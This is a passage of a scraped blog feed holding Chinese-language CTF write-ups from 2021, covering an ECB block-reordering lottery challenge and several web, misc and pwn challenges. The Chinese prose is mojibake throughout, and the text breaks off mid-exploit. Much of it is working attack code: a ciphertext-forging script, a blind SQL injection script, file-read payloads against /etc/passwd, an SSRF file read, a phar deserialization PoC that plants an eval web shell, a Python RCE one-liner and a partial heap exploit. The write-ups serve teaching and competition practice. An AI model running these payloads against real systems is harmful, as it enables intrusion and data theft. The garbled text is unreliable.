UTC\u0026#39;#adminå‘å¸ƒçš„ç¬¬ä¸€ä¸ªPubic noteæ—¶é—´ l = [i/10000 for i in range(0, 10000)]#å°æ•°éƒ¨åˆ†ï¼Œlæ˜¯ä¸€ä¸ªåˆ—è¡¨ for j in range(0,60): ta1 = time.strptime(\u0026#39;2021-01-15 10:29:{} UTC\u0026#39;.format(j), \u0026#39;%Y-%m-%d%H:%M:%S UTC\u0026#39;)#æ ¼å¼åŒ–æ—¶é—´ï¼Œå› ä¸ºæ—¶åŒºä¸åŒéœ€è¦åŠ 8å°æ—¶  ta = int(time.mktime(ta1))#è½¬æ¢ä¸ºæ—¶é—´æˆ³ for i in l: t = ta + i#æ•´æ•°éƒ¨åˆ†ä¸å°æ•°éƒ¨åˆ†æ‹¼æ¥ random.seed(t) u_id = get_random_id() random.seed(u_id + post_at) p_id = get_random_id() if p_id == \u0026#39;lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u\u0026#39;:#adminå‘å¸ƒçš„ç¬¬ä¸€ä¸ªPubic note print(u_id) #ç®—å‡ºæ¥admindçš„useridæ˜¯7bdeij4oiafjdypqyrl2znwk7w9lulgn if(i*10000 % 8999 == 0): print(i, t) æœ‰ä¸€ä¸ªå‘ï¼Œå› ä¸ºæ—¶åŒºåŸå› ï¼Œä»è·å¾—çš„æ—¶é—´åæ¨æ—¶é—´æˆ³çš„æ—¶å€™éœ€è¦åŠ 8ä¸ªå°æ—¶\n*ctf{Y0u_Are_t3e_Master_of_3he_Time!}\nlottery again è€ƒç‚¹ï¼šEBCé‡æ’æ”»å‡»ï¼Œjson_decode\né¢˜ç›®åˆ†æ é¢˜ç›®é¦–å…ˆç»™äº†æºç ï¼šsource.zip\nç½‘ç«™çš„åŠŸèƒ½æ˜¯æ³¨å†Œï¼Œç™»é™†ï¼Œbuy lotteryï¼Œæ¯ä¸€ä¸ªç”¨æˆ·åˆå§‹åªæœ‰300ï¼Œä¹°ä¸€æ¬¡å½©ç¥¨èŠ±100ï¼Œè·å¾—é‡‘é¢æ˜¯1~100ï¼Œç„¶è€Œflagéœ€è¦9999ã€‚\næ‰“å¼€æºç ï¼Œå®¡è®¡ï¼Œä¸»è¦åŠŸèƒ½åœ¨Http/Controller/LotteryController.php\nåŒæ—¶ç»“åˆæŠ“åˆ°çš„æ•°æ®åŒ…ï¼Œæˆ‘ä»¬å¾—çŸ¥è¿ä½œæ–¹å¼æ˜¯ï¼š\nfunction buy()(ç”Ÿæˆä¸€å•lotteryï¼Œè¿”å›å¯¹ç§°åŠ å¯†åçš„enc)-\u0026gt;\rfunction info()(å®¢æˆ·ç«¯å‘é€encï¼ŒæœåŠ¡ç«¯å¯¹ç§°è§£å¯†å¹¶ä¸”jsondecodeï¼Œè¿”å›è¿™å•lotteryçš„ä¿¡æ¯)-\u0026gt;\rfunction charge()(æ¥æ”¶å®¢æˆ·ç«¯çš„encï¼Œå¯¹ç§°è§£å¯†å¹¶ä¸”jsondecodeï¼Œæ ¹æ®è§£å¯†å¾—åˆ°çš„user uuidæ‰¾åˆ°ç”¨æˆ·ä¿¡æ¯ï¼Œæ ¹æ®lottery uuidæ‰¾åˆ°lotteryä¿¡æ¯ï¼ŒæŠŠlotteryçš„é’±åŠ åˆ°userè´¦æˆ·)\råœ¨function buy()é‡Œé¢æœ‰è¿™ä¹ˆå‡ è¡Œä»£ç ï¼š\n$lottery = Lottery::create([\u0026#39;coin\u0026#39; =\u0026gt; 100 - floor(sqrt(random_int(1, 10000)))]); $serilized = json_encode([ \u0026#39;lottery\u0026#39; =\u0026gt; $lottery-\u0026gt;uuid, \u0026#39;user\u0026#39; =\u0026gt; $user-\u0026gt;uuid, \u0026#39;coin\u0026#39; =\u0026gt; $lottery-\u0026gt;coin, ]); $enc = base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, env(\u0026#39;LOTTERY_KEY\u0026#39;), $serilized, MCRYPT_MODE_ECB)); æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–ä½¿ç”¨äº†EBCæ¨¡å¼å’Œrijndael256æ¥å¯¹encè¿›è¡ŒåŠ å¯†ï¼›\nEBCåŠ å¯†æ¨¡å¼  ECBæ¨¡å¼æ˜¯æ‰€æœ‰æ¨¡å¼ä¸­æœ€ç®€å•çš„ä¸€ç§ã€‚æ˜æ–‡åˆ†ç»„å’Œå¯†æ–‡åˆ†ç»„æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå¦‚æœæ˜æ–‡åˆ†ç»„æœ‰ç›¸åŒçš„é‚£ä¹ˆæœ€åçš„å¯†æ–‡ä¸­ä¹Ÿä¼šæœ‰ç›¸åŒçš„å¯†æ–‡åˆ†ç»„ã€‚\nå› ä¸ºæ¯ä¸ªåˆ†ç»„éƒ½ç‹¬è‡ªè¿›è¡ŒåŠ å¯†è§£å¯†ï¼Œæ‰€ä»¥æ— éœ€ç ´è§£å¯†æ–‡å°±èƒ½æ“çºµéƒ¨åˆ†æ˜æ–‡ï¼Œæˆ–è€…æ”¹å˜æ˜æ–‡ï¼Œåœ¨ä¸çŸ¥é“åŠ å¯†ç®—æ³•çš„æƒ…å†µä¸‹å¾—åˆ°å¯†æ–‡ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»æ•ˆæœï¼Œå¦‚å›¾æ‰€ç¤ºï¼ˆç¿»è½¬å¯†æ–‡åˆ†ç»„ï¼Œé‚£ä¹ˆæ˜æ–‡åˆ†ç»„ä¹Ÿä¼šè¢«ç¿»è½¬ï¼‰\n ECBå—é‡æ’æ”»å‡» å‰æ–‡è¯´è¿‡ï¼Œåœ¨å—åŠ å¯†ä¸­ECBæ¨¡å¼ä¸­æ¯ä¸ªå—éƒ½æ˜¯ç‹¬ç«‹åŠ å¯†çš„ã€‚å› æ­¤æ”»å‡»è€…å¯ä»¥åœ¨æœªçŸ¥å¯†é’¥çš„æƒ…å†µä¸‹ï¼Œå¯¹å¯†æ–‡ä¸­çš„å—è¿›è¡Œé‡æ–°æ’åˆ—ï¼Œç»„åˆæˆåˆæ³•çš„å¯è§£å¯†çš„æ–°å¯†æ–‡ã€‚\nä¸¾ä¸€ä¸ªä¾‹å­ï¼ŒæŸCMSçš„cookieæ ¼å¼ä¸ºDES-ECBåŠ å¯†åçš„æ•°æ®ï¼Œè€Œæ˜æ–‡æ ¼å¼å¦‚ä¸‹ï¼š\nadmin=0;username=pan\rç”±äºDESä½¿ç”¨çš„å—å¤§å°æ˜¯8å­—èŠ‚ï¼Œå› æ­¤ä¸Šè¿°æ˜æ–‡å¯ä»¥åˆ‡åˆ†æˆä¸‰ä¸ªå—ï¼Œå…¶ä¸­@ä¸ºå¡«å……ç¬¦å·ï¼š\nadmin=0;\rusername\r=pan@@@@\rå‡è®¾æˆ‘ä»¬å¯ä»¥æ§åˆ¶è‡ªå·±çš„ç”¨æˆ·åï¼ˆåœ¨æ³¨å†Œæ—¶ï¼‰ï¼Œé‚£ä¹ˆæœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥åœ¨ä¸çŸ¥é“å¯†é’¥çš„æƒ…å†µä¸‹å°†è‡ªå·±æå–ä¸ºç®¡ç†å‘˜å‘¢ï¼ˆå³admin=1ï¼‰ï¼Ÿé¦–å…ˆå°†ç”¨æˆ·åè®¾ç½®ä¸ºpan@@@@admin=1;ï¼Œæ­¤æ—¶æ˜æ–‡å—çš„å†…å®¹å¦‚ä¸‹ï¼š\nadmin=0;username=pan@@@@admin=1;\ræˆ‘ä»¬æ‰€éœ€è¦åšçš„ï¼Œå°±æ˜¯åœ¨åŠ å¯†å®Œæˆåï¼Œå°†æœåŠ¡å™¨è¿”å›çš„cookieä½¿ç”¨æœ€åä¸€ä¸ªå—æ›¿æ¢ç¬¬ä¸€ä¸ªå—ï¼Œè¿™æ ·ä¸€æ¥å°±è·å¾—äº†ä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™çš„åˆæ³•cookieäº†ã€‚\nå›åˆ°é¢˜ç›® è¯·æ±‚/lottery/buyè·¯ç”±çš„æ—¶å€™ï¼Œç”±äºä½¿ç”¨çš„æ˜¯EBCæ¨¡å¼çš„åŠ å¯†ï¼Œæ¯ä¸€å—å¯†æ–‡ç›´æ¥ä¸æ˜æ–‡å¯¹åº”\nè€Œè¯·æ±‚/lottery/chargeçš„æ—¶å€™æœåŠ¡ç«¯ç›´æ¥è§£å¯†æˆ‘ä»¬ä¼ è¿‡å»çš„encï¼Œæ ¹æ®lotteryçš„uuidå’Œuserçš„uuidæ¥æŠŠlotteryçš„é‡‘é¢åŠ å…¥è´¦æˆ·ä½™é¢ã€‚\nåˆ©ç”¨è¿™ä¸€ç‚¹æˆ‘ä»¬ä¾¿å¯ä»¥æ³¨å†Œå¤šä¸ªè´¦æˆ·ï¼Œç”Ÿæˆå¤šä¸ªlotteryçš„uuidå¹¶ä¸”é€šè¿‡æŠŠlotteryçš„uuidæ‹¼æ¥åˆ°è¯·æ±‚/lottery/chargeæ—¶çš„encï¼Œæ¥è®©å¤šä¸ªlotteryçš„é‡‘é¢å­˜åˆ°åŒä¸€ä¸ªuserï¼Œåˆ·é’±ã€‚\næœ¬é¢˜ä½¿ç”¨çš„æ˜¯MCRYPT_RIJNDAEL_256åŠ å¯†ï¼Œrijndael128ä¸aesç›¸åŒï¼Œéƒ½æ˜¯ä»¥128ä½ä¸ºä¸€ä¸ªå—åŠ å¯†ï¼Œrijndael256åˆ™æ˜¯ä»¥256ä½ä¸ºä¸€ä¸ªå—ï¼Œå³32å­—èŠ‚ã€‚\nå¯¹äºä¸€ä¸ªencè€Œè¨€ï¼š\n{\u0026#34;lottery\u0026#34;:\u0026#34;bb9c4db6-d339-4a26-9|397-caeb4bfe043e\u0026#34;,\u0026#34;user\u0026#34;:\u0026#34;157b58|a1-108b-47cc-abf4-fff1f903b05d\u0026#34;,|\u0026#34;coin\u0026#34;:6}@@@@@@@@@@@@@@@@@@@@@@@ //@æ˜¯å¡«å…… å¯ä»¥çœ‹åˆ°æ— è®ºæˆ‘ä»¬æ›¿æ¢å“ªä¸€å—ï¼Œéƒ½æ²¡æœ‰åŠæ³•å®Œå…¨æ§åˆ¶useræˆ–è€…lotteryï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æŠŠç¬¬ä¸€å•lotteryçš„1ï¼Œ2å—åŠ ä¸Šç¬¬äºŒå•lotteryçš„2ï¼Œ3ï¼Œ4å—ï¼Œæ„æˆç±»ä¼¼äºä¸‹é¢çš„payloadï¼š\n{\u0026#34;lottery\u0026#34;:\u0026#34;1287901b-89d7-4b94-a|0d7-a7655d85800d\u0026#34;,\u0026#34;user\u0026#34;:\u0026#34;157b58|397-caeb4bfe043e\u0026#34;,\u0026#34;user\u0026#34;:\u0026#34;157b58|a1-108b-47cc-abf4-fff1f903b05d\u0026#34;,|\u0026#34;coin\u0026#34;:6}@@@@@@@@@@@@@@@@@@@@@@@ å‰é¢çš„useråœ¨json_decodeä¹‹åä¼šè¢«åé¢çš„useræ‰€è¦†ç›–ï¼Œå½¢æˆäº†userä¸å˜è€Œlotteryä»»æ„æ§åˆ¶çš„å±€é¢\nè´´ä¸€ä¸ªJrXnmå¸ˆå‚…çš„expï¼š\nimport requests import random import string import json import base64 from urllib.parse import quote user_token = \u0026#34;Yu5PGq2I0jhZssXttlEaiBkNQXRrxzbD\u0026#34; user_uuid = \u0026#34;ae4774be-2e44-49d2-82dc-6c69c57c4378\u0026#34; user_enc = b\u0026#34;+Zza7U18mMFaHhYyrTaOr\\/IubODmR8QF1yC01+0XIg3Ea0s5evdcMwcHHNovcM3pytuj4wsD2NFsMv1g+yjXfyEFlnH5hTkHnLKzkFc0dmHqydlPZNnijH8cHjiFVPKU4tKa3tbXh1v0ZTejYwnrwjeWiY89xrpsXSMn2CEt8bM=\u0026#34; cookie = { \u0026#34;api_token\u0026#34;: user_token } url = \u0026#34;http://52.149.144.45:8080\u0026#34; def get_random(): return \u0026#39;\u0026#39;.join(random.sample(string.ascii_letters + string.digits, 10)) def register(): username=get_random() data= { \u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: \u0026#34;asdasd\u0026#34; } res = requests.post(url + \u0026#34;/user/register\u0026#34;,data=data) d = json.loads(res.text) return username def login(username, password=\u0026#34;asdasd\u0026#34;): data = { \u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password } res = requests.post(url + \u0026#34;/user/login\u0026#34;,data=data) d = json.loads(res.text) return d[\u0026#39;user\u0026#39;][\u0026#39;api_token\u0026#39;] def info(api_token): res = requests.get(url + \u0026#34;/user/info?api_token=\u0026#34; + api_token) d = json.loads(res.text) print(\u0026#39;uuid: \u0026#39;+d[\u0026#39;user\u0026#39;][\u0026#39;uuid\u0026#39;]) def buy(api_key): data = { \u0026#34;api_token\u0026#34;: api_key } res = requests.post(url + \u0026#34;/lottery/buy\u0026#34;,data=data) #print(res.text) d = json.loads(res.text) return d[\u0026#39;enc\u0026#39;] def get_enc(enc): o = base64.b64decode(enc) u = base64.b64decode(user_enc) m = base64.b64encode(o[:64] + u[32:]) print(\u0026#39;enc: \u0026#39;, end=\u0026#39;\u0026#39;) print(quote(m)) return m def charge(enc): data = { \u0026#34;user\u0026#34;: user_uuid, \u0026#34;enc\u0026#34;: enc, \u0026#34;coin\u0026#34;: \u0026#34;7\u0026#34; } res = requests.post(url + \u0026#34;/lottery/charge\u0026#34;, data=data, cookies=cookie) print(\u0026#34;charge: \u0026#34;, end=\u0026#39;\u0026#39;) print(res.content) if __name__ == \u0026#34;__main__\u0026#34;: while True: try: username = register() api_token = login(username) enc = buy(api_token) info(api_token) mo_enc = get_enc(enc) charge(mo_enc) except: pass JrXnmå¸ˆå‚…tqlï¼Œè†œ\noh-my-bet è€ƒç‚¹ï¼š\nå‚è€ƒï¼š\n *CTF Writeup by æ˜Ÿç›Ÿ\nå¯¹ç§°åŠ å¯†ä¸æ”»å‡»æ¡ˆä¾‹åˆ†æ\n ","date":"2021-01-19T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228100314.jpeg","permalink":"https://anthem-whisper.github.io/p/starctf-2021-%E5%A4%8D%E7%8E%B0/","title":"starCTF 2021 å¤ç°"},{"content":"web easyci è€ƒç‚¹ï¼šMySQLè¯»å†™æ–‡ä»¶\nå’Œå·…å³°æå®¢çš„å‰ç«¯ä¸€æ ·ï¼Œè€Œä¸”å‘ç°ä¹Ÿæ˜¯å¸ƒå°”ç›²æ³¨ï¼Œä¸€é˜µç‹‚å–œï¼›\nfuzzä¸€ç•ªç«Ÿç„¶æ²¡æœ‰ä»»ä½•è¿‡æ»¤\nexp:\n#python3 import requests import time host = \u0026#39;http://eci-2zegnayqf8pwz72ze2yw.cloudeci1.ichunqiu.com/public/index.php/home/login\u0026#39; def mid(bot, top): return (int)(0.5*(top+bot)) def transToHex(flag): res = \u0026#39;\u0026#39; for i in flag: res += hex(ord(i)) res = \u0026#39;0x\u0026#39; + res.replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;) return res def sqli(): name = \u0026#39;\u0026#39; for j in range(1, 2000): top = 126 bot = 32 while top \u0026gt; bot: #babyselect = \u0026#39;(database())\u0026#39;#p3rh4ps babyselect = \u0026#39;password\u0026#39;#c3762483bc73d0b7943156d43911ce38-\u0026gt;HEIHEIHEIHEI #babyselect = \u0026#34;\u0026#34; payload = \u0026#34;0\u0026#39;||ascii(substr({},{},1))\u0026gt;{}#\u0026#34;.format(babyselect, j, mid(bot, top)) data = { \u0026#34;username\u0026#34;: payload, \u0026#34;password\u0026#34;: \u0026#34;1\u0026#34; } proxy = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} try: r = requests.post(url=host, data=data, timeout=3, proxies=proxy) #print(payload) #print(r.text) if r.text.count(\u0026#39;\u0026gt;å¯†ç é”™è¯¯\u0026lt;\u0026#39;) == 1: bot = mid(bot, top) + 1 else: top = mid(bot, top) except: continue name += chr(top) print(name) if __name__ == \u0026#39;__main__\u0026#39;: sqli() æ³¨å‡ºå¯†ç ï¼Œç™»é™†ä¹‹åï¼Œä½ å°±ä¸­è®¡äº†ï¼›\næ‰«ç›®å½•å¯ä»¥æ‰«åˆ°å¾ˆå¤šjsonï¼Œé‡Œé¢å«æœ‰ä¸€äº›ç»„ä»¶ä¿¡æ¯\nä¸è¿‡æŸ¥çœ‹äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªæ¡†æ¶è¿™ä¸ªç‰ˆæœ¬ç›®å‰æ˜¯æ²¡æœ‰ç¬¦åˆæƒ…æ™¯çš„æ¼æ´çš„ï¼›\nçœŸæ­£çš„åˆ©ç”¨ç‚¹å…¶å®å°±åœ¨ä¸€å¼€å§‹çš„ç™»é™†ç•Œé¢ï¼Œæ²¡æœ‰ä»»ä½•wafå…¶å®ä¹ŸæŒºå¥‡æ€ªï¼Œè¯´æ˜è¿™é“é¢˜å¯èƒ½ä¸æ˜¯å¸¸è§„è€ƒç‚¹\nè¯»å–/etc/passwdï¼š\n0'||ascii(substr((select load_file('/etc/passwd')),1,1))\u0026gt;79#\rå‘ç°èƒ½è¯»ï¼Œä½†æ˜¯/var/www/htmlè·¯å¾„å´è¯»ä¸åˆ°ä¸œè¥¿ï¼›\né‚£ä¹ˆçŒœæµ‹webè·¯å¾„å¯èƒ½è¢«æ”¹äº†ï¼Œæ”¹äº†å°±å¯ä»¥çŒœï¼ŒçŒœä¸åˆ°å°±åªèƒ½è¯»ï¼›\nmdï¼Œç¡®å®çŒœä¸åˆ°ã€‚\nè¯»å–/etc/apache2/apache2.conf(å¤ªé•¿äº†æˆ‘å°±ä¸è´´ä»£ç äº†)ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªè·¯å¾„å€¼å¾—å…³æ³¨ï¼š\næ²¡é”™ï¼Œwebè·¯å¾„å°±æ˜¯/var/sercet/html/ï¼Œç”¨0'||ascii(substr((select load_file('/var/sercet/html/index.php')),1,1))\u0026gt;79#å¯ä»¥è¯»å–index.phpçš„æºç ï¼š\nSQLmapä¸€æ¢­å­Getshell\nä½¿ç”¨\u0026ndash;file-destå’Œ\u0026ndash;file-writeå‚æ•°çš„è¯ï¼Œåªèƒ½åˆ›å»ºé‚£ä¸ªæ–‡ä»¶ä½†æ˜¯ä¸èƒ½å†™å…¥å†…å®¹ã€‚è¿™é‡Œåªèƒ½ç”¨\u0026ndash;os-shelæ¥è¿›è¡Œå†™å…¥ï¼›\né‡åˆ°ç„å­¦ï¼Œæ²¡æ¢­è¿›å»ã€‚ã€‚ã€‚ã€‚æŒ‰ç†è¯´æ˜¯æ²¡é—®é¢˜çš„ï¼Œsqlmapå†™çš„æ—¶å€™ä¼šç¥å¿…åœ¨åé¢æ‹¼æ¥è·¯å¾„ï¼Œç„¶åå¥½åƒåªæœ‰webæ ¹ç›®å½•å¯ä»¥å†™\nezcms æ‰«ç›®å½•www.zipä¸‹è½½æºç \nå‘ç°æ˜¯yzmcms\ncommon\\config\\config.phpçœ‹åˆ°æ•°æ®åº“é…ç½®\n/admin/index/login.htmlä¸ºç®¡ç†å‘˜åå°ï¼Œå°è¯•é»˜è®¤å£ä»¤yzmcms/yzmcmsç™»å½•å¤±è´¥ï¼Œå°è¯•æ˜¯å¦å¯†ç ä¸ºadmin/admin868ï¼ŒæˆåŠŸç™»é™†\nç„¶åæ‰¾å„ç§ç¼–è¾‘å™¨ä¸Šä¼ ã€æ¨¡æ¿ä¿®æ”¹ï¼Œä½†éƒ½è¿›è¡Œäº†ä¸¥æ ¼é™åˆ¶\nè°·æ­Œç™¾åº¦æ²¡æ‰¾åˆ°å•¥å¯ç”¨çš„æ´\næ‰¾åˆ°githubæºç ï¼Œçœ‹çœ‹æœ€è¿‘çš„issueï¼Œæ‰¾åˆ°ä¸ªåå°SSRFï¼šhttps://github.com/yzmcms/yzmcms/issues/53\næœ¬åœ°è·Ÿäº†ä¸€ä¸‹ä»£ç ï¼Œåœ¨application\\collection\\controller\\collection_content.class.phpçš„183~224è¡Œçš„public function collection_article_content()\nåœ¨åå°çš„æ¨¡å—ç®¡ç†-\u0026gt;é‡‡é›†ç®¡ç†æ¨¡å—å¤„æ·»åŠ èŠ‚ç‚¹ï¼Œç„¶åç½‘å€å¤„å¡«å†™æ„é€ çš„æ¶æ„é¡µé¢\nè·Ÿè¿›collectionç±»ï¼Œè½¬åˆ°yzmphp\\core\\class\\collection.class.phpï¼š\nå¾ˆæ˜æ˜¾æ— ä»»ä½•è¿‡æ»¤çš„file_get_content()ï¼Œåˆ©ç”¨æ­¤è¿›è¡Œä¸€ä¸ªSSRFå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–\nå°è¯•è¯»/etc/passwd ssrf.htmlï¼š\n\u0026lt;leon\u0026gt;\u0026lt;a href=\u0026#34;httpxxx://../../../../../../etc/passwd\u0026#34;\u0026gt;123\u0026lt;/a\u0026gt;\u0026lt;/leon\u0026gt; è¿™é‡Œç”¨httpxxxæ˜¯å› ä¸ºyzmphp\\core\\class\\collection.class.phpçš„189è¡Œå¯¹urlåè®®å‰å››ä½é™åˆ¶äº†http\né…ç½®å¦‚ä¸‹ï¼š\næˆåŠŸè¯»å–ï¼š å°è¯•è¯»flag:\n\u0026lt;leon\u0026gt;\u0026lt;a href=\u0026#34;httpxxx://../../../../../../flag\u0026#34;\u0026gt;123\u0026lt;/a\u0026gt;\u0026lt;/leon\u0026gt; flag{46a41939-3d92-411f-8ba2-3dbefa6fdff0}\rhello_php æ‰«ç›®å½•www.zipæ‹¿æºç \nç®€å•å®¡è®¡ä¸€ä¸‹ï¼Œæ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åç¼€æ‹¼æ¥.jpgã€index.phpå¾ˆæ˜æ˜¾æœ‰ä¸ªæ–‡ä»¶æ“ä½œå‡½æ•°\næ˜æ˜¾çš„pharååºåˆ—åŒ–ï¼Œçœ‹class.phpæ‰¾ææ„å‡½æ•°ï¼Œå‘ç°å¯¹config.phpè¿›è¡Œå†™å…¥ï¼Œäºæ˜¯åªéœ€è¦ååºåˆ—åŒ–æ§åˆ¶$this-\u0026gt;titleä¸ºæ¶æ„ä»£ç å³å¯ï¼Œç®€å•å†™ä¸ªä¸€å¥è¯shellï¼Œç»•ä¸€ä¸‹æ­£åˆ™æ›¿æ¢ï¼š\npocï¼š\n\u0026lt;?php class Config{ public $title; public $comment; public $logo_url; } $o = new Config(); $o-\u0026gt;title=\u0026#34;\u0026#39;;eval(\\$_GET[a]);#\u0026#34;; @unlink(\u0026#34;test.phar\u0026#34;); $phar = new Phar(\u0026#34;test.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); $phar-\u0026gt;setMetadata($o); $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering(); ?\u0026gt;ç”Ÿæˆpharæ–‡ä»¶ä¸Šä¼ ï¼Œç”±äºæ–‡ä»¶åæ˜¯md5(time())ï¼Œæ‰€ä»¥çˆ†ç ´ä¸Šä¼ ä¸€ä¸‹å°±è¡Œ\nexp:\nindex.php?img=phar://./static/02b969e2b0f2619f59521f67aa8c035d.jpg\rè§¦å‘pharååºåˆ—åŒ–å,config.phpå°±å†™å…¥äº†æ¶æ„ä»£ç ï¼Œindex.phpincludeäº†config.phpï¼Œæ‰€ä»¥ç›´æ¥:\nflag{0f131b09-a441-4723-bc02-bf4516863884}\rå¤§å®¶ä¸€èµ·æ¥å®¡CMS www.zip æºç \næ˜¯æµ·æ´‹cms\nåœ¨ adm1n/admin_smtp.php å‘ç°äº† ç›´æ¥æ²¡æœ‰wafçš„å†™å…¥ï¼Œå¹¶ä¸”æ˜¯å¾€ä¸€ä¸ªphpæ–‡ä»¶é‡Œé¢å†™ï¼Œç”±äºä¸€äº›å˜é‡å¯æ§è®©æˆ‘ä»¬å¯ä»¥ä»£ç æ³¨å…¥ admin\\adminç™»é™†åå°ï¼› ä¹‹åè®¿é—®admin_smtp.phpï¼Œåœ¨ç‚¹å‡»â€œç¡®è®¤â€çš„æ—¶å€™æŠ“å–æ•°æ®åŒ…ï¼Œæ”¹åŒ…ï¼š\nç›´æ¥æ¥ä¸€å‘ï¼š Misc ç­¾åˆ° å…«è¿›åˆ¶\né—®å· å¡«å†™é—®å·\nbabymaze1 #coding=utf-8 from pwn import* import numpy as np #context.log_level = \u0026#39;DEBUG\u0026#39; def Get_T(s): line = [] tmp = [] j = 0 k = 0 start = [] end = [] data = \u0026#39;\u0026#39; for i in range(s): data += p.recvline() data = data.replace(\u0026#39;\\x23\u0026#39;,\u0026#39;\\x00\u0026#39;) # black  data = data.replace(\u0026#39;\\x20\u0026#39;,\u0026#39;\\x01\u0026#39;) # white data = data.replace(\u0026#39;\\x24\u0026#39;,\u0026#39;\\x03\u0026#39;) # flag data = data.replace(\u0026#39;\\x2A\u0026#39;,\u0026#39;\\x02\u0026#39;) for i in data: if(i == \u0026#39;\\n\u0026#39;): line.append(tmp) tmp = [] j += 1 k = 0 elif(i == \u0026#39;\\x02\u0026#39;): start.append(j) start.append(k) k += 1 tmp.append(ord(i)) elif(i == \u0026#39;\\x03\u0026#39;): end.append(j) end.append(k) k += 1 tmp.append(ord(i)) else: k += 1 tmp.append(ord(i)) return line,start,end ############################### def up(location): # åˆ°è¾¾äº†æ•°ç»„é¡¶ç«¯ if location[0] == 0: return False else: new_location = [location[0] - 1, location[1]] # èµ°è¿‡çš„è·¯ä¸å†èµ° if new_location in history_path: return False # é‡åˆ°å¢™ä¸èµ° elif maze[new_location[0]][new_location[1]] == 0: return False else: lookup_path.append(new_location) history_path.append(new_location) return True def down(location): # é‡åˆ°è¿·å®«æœ€ä¸‹æ–¹çš„æ—¶å€™ï¼Œä¸èƒ½ç»§ç»­å¾€ä¸‹èµ° if location[0] == len(maze) - 1: return False else: new_location = [location[0] + 1, location[1]] # èµ°è¿‡çš„è·¯ä¸å†èµ° if new_location in history_path: return False # é‡åˆ°å¢™ä¸èµ° elif maze[new_location[0]][new_location[1]] == 0: return False else: history_path.append(new_location) lookup_path.append(new_location) return True def left(location): # é‡åˆ°è¿·å®«æœ€å·¦è¾¹ï¼Œä¸èƒ½ç»§ç»­å¾€å·¦èµ° if location[1] == 0: return False else: new_location = [location[0], location[1] - 1] # èµ°è¿‡çš„è·¯ä¸å†èµ° if new_location in history_path: return False # é‡åˆ°å¢™ä¸èµ° elif maze[new_location[0]][new_location[1]] == 0: return False else: history_path.append(new_location) lookup_path.append(new_location) return True def right(location): # é‡åˆ°è¿·å®«æœ€å³è¾¹ï¼Œä¸èƒ½ç»§ç»­å‘å³ç§»åŠ¨ if location[1] == len(maze[0]) - 1: return False else: new_location = [location[0], location[1] + 1] # èµ°è¿‡çš„è·¯ä¸å†èµ° if new_location in history_path: return False # é‡åˆ°å¢™ä¸èµ° elif maze[new_location[0]][new_location[1]] == 0: return False else: history_path.append(new_location) lookup_path.append(new_location) return True def get_line(path): p = \u0026#39;\u0026#39; for i in range(len(path)-1): tmp1 = path[i] tmp2 = path[i + 1] if tmp1[0] \u0026gt; tmp2[0]: p += \u0026#39;w\u0026#39; elif tmp1[0] \u0026lt; tmp2[0]: p += \u0026#39;s\u0026#39; if tmp1[1] \u0026gt; tmp2[1]: p += \u0026#39;a\u0026#39; elif tmp1[1] \u0026lt; tmp2[1]: p += \u0026#39;d\u0026#39; return p p = remote(\u0026#39;182.92.203.154\u0026#39;,11001) p.sendlineafter(\u0026#39;Please press any key to start.\u0026#39;,\u0026#39;FMYY\u0026#39;) for i in range(5): log.info(\u0026#39;LEVEL\u0026#39; + str(i+1)) maze,start,end = Get_T(11 + i*10) lookup_path = [] history_path = [] lookup_path.append(start) history_path.append(start) while lookup_path[-1] != end: now = lookup_path[-1] if up(now) or down(now) or left(now) or right(now): continue lookup_path.pop() #print(\u0026#34;Final:\u0026#34;, lookup_path) path = get_line(lookup_path) #log.info(\u0026#39;PATH:\\t\u0026#39; + path) p.sendlineafter(\u0026#39;\u0026gt; \u0026#39;,path) p.recvuntil(\u0026#39;your win\\n\u0026#39;) p.interactive() babymaze2 inputæ¼æ´å‡½æ•°çš„éé¢„æœŸRCE\n__import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat flag\u0026#39;) é©¬èµ›å…‹ Depixç›´æ¥çœ‹\nPwn wind_farm_panel from pwn import* def menu(ch): p.sendlineafter(\u0026#39;\u0026gt;\u0026gt; \u0026#39;,str(ch)) def new(index,size,content): menu(1) p.sendlineafter(\u0026#39;: \u0026#39;,str(index)) p.sendlineafter(\u0026#39;turbine: \u0026#39;,str(size)) p.sendafter(\u0026#39;name: \u0026#39;,content) def show(index): menu(2) p.sendlineafter(\u0026#39;viewed: \u0026#39;,str(index)) def edit(index,content): menu(3) p.sendlineafter(\u0026#39;turbine: \u0026#39;,str(index)) p.sendafter(\u0026#39;input: \u0026#39;,content) p = process(\u0026#39;./main\u0026#39;) p = remote(\u0026#39;182.92.203.154\u0026#39;,28452) libc =ELF(\u0026#39;./libc-2.23.so\u0026#39;) new(0,0x200,\u0026#39;\\x00\u0026#39;*0x208 + p32(0xDF1)) new(1,0x1000,\u0026#39;FMYY\u0026#39;) new(2,0x100,\u0026#39;\\xA0\u0026#39;) show(2) libc_base = u64(p.recvuntil(\u0026#39;\\x7F\u0026#39;)[-6:].ljust(8,\u0026#39;\\x00\u0026#39;)) - libc.sym[\u0026#39;__malloc_hook\u0026#39;] - 0x70 - 0x620 log.info(\u0026#39;LIBC:\\t\u0026#39; + hex(libc_base)) IO_list_all = libc_base + 